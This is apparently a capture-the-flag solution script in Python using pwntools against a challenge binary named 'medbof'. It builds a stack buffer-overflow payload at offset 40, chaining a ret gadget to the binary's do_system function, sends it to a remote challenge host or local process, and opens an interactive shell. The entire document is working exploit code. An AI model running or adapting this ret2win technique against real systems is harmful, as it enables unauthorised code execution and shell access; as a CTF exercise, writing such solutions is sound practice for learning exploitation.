#!/usr/bin/env python3

from pwn import *

exe = ELF("medbof")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 27380)

    return r


def main():
    r = conn()

    # good luck pwning :)
    
    offset = 40
    
    payload = flat({offset : [
        ROP(exe).find_gadget(['ret'])[0],
        exe.sym['do_system']
    ]})

    r.sendline(payload)
    
    r.interactive()


if __name__ == "__main__":
    main()
